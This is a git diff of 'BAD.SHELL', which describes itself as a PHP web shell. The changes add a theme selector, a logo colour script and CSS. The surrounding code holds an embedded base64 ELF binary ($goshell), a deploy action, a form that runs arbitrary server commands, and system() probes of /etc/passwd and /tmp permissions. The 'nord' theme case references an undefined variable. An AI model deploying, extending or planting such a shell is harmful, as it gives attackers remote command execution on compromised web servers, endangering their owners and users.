@@ -1,3 +1,5 @@
+<?php session_start(); ?>
+
 <!DOCTYPE HTML>
 <html>
 <head>
@@ -6,8 +8,17 @@
     <title>BAD.SHELL</title>
 </head>
 <body>
-<?php
+	
+<script>
+let colors = ["firebrick","gold","forestgreen","cornflowerblue","darkorchid"];
+let n = Math.floor(Math.random() * colors.length);
+let logoColor = document.createElement("style");
+logoColor.type = "text/css";
+logoColor.innerText = `.logo { color: ${colors[n]}; }`;
+document.head.appendChild(logoColor);
+</script>
 
+<?php
 $goshell = "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAASJlKAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAD
 AEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAlqsKAAAAAACWqwoAAAAAAAAQ
 AAAAAAAAAQAAAAYAAAAAAAAAAAAAAACwSgAAAAAAALBKAAAAAAAAAAAAAAAAAIh2GgAAAAAAABAA
@@ -12297,19 +12308,35 @@ $shelladdr = $_SERVER['SERVER_ADDR'];
 
 ?>
 
+<?php // SETTINGS (WITH PHP SESSION):
+
+// THEMES:
+$retro = ":root { --BG: #1C1C1C; --BGDIM:#1A1A1A; --BG2: #0C0C0C; --TEXT: #C1C1C1; --WARN: #FF9000; --INFO: #3377FF; --ERR: #DD2000; --OK: #00A020; }";
+$hacker = ":root { --BG: #0F0F0F; --BGDIM:#1A1A1A; --BG2: #0C0C0C; --TEXT: #32CD32; --WARN: #FF9000; --INFO: #3377FF; --ERR: #DD2000; --OK: #00A020; }";
+
+if($_GET['theme']){
+	switch($_REQUEST['theme']){
+		case 'nord':
+			$theme = $nord;
+			break;
+		case 'hacker':
+			$_SESSION['theme'] = $hacker;
+			break;
+		case 'retro':
+			$_SESSION['theme'] = $retro;
+			break;
+		default:
+			$_SESSION['theme'] = $retro; // This is the Default Theme:
+			break;		
+}
+}
+
+echo("<style>" . $_SESSION['theme'] . "</style>");
+
+?>
+
 <!-- Style -->
 <style>
-
-:root {
-    --BG: #1C1C1C;
-    --BGDIM:#1A1A1A;
-    --BG2: #0C0C0C;
-    --TEXT: #C1C1C1;
-    --WARN: #FF9000;
-    --INFO: #3377FF;
-    --ERR: #DD2000;
-    --OK: #00A020;
-}
 
 * {
   box-sizing: border-box;
@@ -12384,6 +12411,16 @@ pre {
 #command:focus {
     background-color: var(--TEXT);
     color: var(--BG2);
+    padding-left: 2%;
+}
+
+#command::placeholder {
+	padding-left: 1%;
+}
+
+#command:focus::placeholder {
+	color: var(--BG2);
+	padding-left: 0%;
 }
 
 #runbtn {
@@ -12521,6 +12558,21 @@ pre {
 	width: 80%;
 }
 
+.panel-settings pre {
+	float: left;
+}
+
+.panel-settings select {
+	float: left;
+	background-color: var(--BG);
+	color: var(--TEXT);
+	border: solid 1px var(--TEXT);
+}
+
+.panel-settings input {
+	float: left;
+}
+
 .warning {
 	color: var(--WARN);
 }
@@ -12548,7 +12600,7 @@ pre {
     <ul>
         <li onclick="openPanel('panel-tools')">TOOLS</li>
         <li onclick="openPanel('panel-info')">INFO</li>
-        <li>SETTINGS</li>
+        <li onclick="openPanel('panel-settings')">SETTINGS</li>
         <li>HELP</li>
     </ul>
 </div>
@@ -12560,10 +12612,10 @@ if(!$_GET){
 	global $logo;
 	global $version;
 	echo "<pre>";
-	echo "\n\n";
-	echo $logo;
 	echo "\n";
-	echo "Welcome to BAD.SHELL $version - A PHP Web Shell made with ♥";
+	echo "<span class='logo'>$logo</span>";
+	echo "\n";
+	echo "Welcome to BAD.SHELL $version - A PHP Web Shell made with <span class='error'>♥</span>";
 	echo "</pre>";
 }
 
@@ -12661,7 +12713,7 @@ if ($_REQUEST['deploygo'] == 'RUN') {
 </div>
 <div id="input">
     <form method="get">
-    <input id="command" type="text" name="cmd" placeholder=" Write command here and press Enter or RUN"autofocus>
+    <input id="command" type="text" name="cmd" placeholder="Write command here and press Enter or RUN"autofocus>
     <input id="runbtn" type="submit" value="RUN">
     </form>
 </div>
@@ -12699,7 +12751,17 @@ if ($_REQUEST['deploygo'] == 'RUN') {
     <pre>Current Dir Permissions: <span class="info-cmd"><?php system("stat -c '%U %G %A' ./"); ?></span></pre>
     <pre>/etc/passwd: <span class="info-cmd"><?php system('stat -c "%A" /etc/passwd'); ?></span></pre>
     <pre>/tmp: <span class="info-cmd"><?php system('stat -c "%A" /tmp'); ?></span></pre>
-
+</div>
+<div id="panel" class="panel-settings">
+    <h1>SETTINGS</h1>
+    <form method="get">
+	<pre>Theme: </pre>
+		<select name="theme" id="theme_selection">
+			<option value="retro">Retro</option>
+			<option value="hacker">Hacker</option>
+    </select>
+    <input type="submit" value="SAVE">
+    </form>
 </div>
 
 <!-- Javascript -->
